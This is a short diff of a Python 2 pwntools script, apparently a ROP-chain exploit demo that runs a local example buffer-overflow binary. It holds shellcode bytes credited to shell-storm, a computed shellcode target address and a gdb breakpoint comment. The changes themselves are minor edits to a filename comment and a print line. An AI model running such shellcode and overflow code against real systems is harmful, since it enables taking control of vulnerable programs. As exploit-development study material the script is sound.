@@ -2,6 +2,7 @@ import sys, logging
 from pwn import *
 import ropme
 
+#filename = './example/bof_syscall'
 filename = './example/bof'
 p = process([filename,'3000'])
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
@@ -23,7 +24,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 target_address = buffer_address + 1024
-print "shellcode address: 0x{:x}".format(target_address)
+print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
 if len(sys.argv) < 2: # manual mode
   print "Using manually built ROP chain"
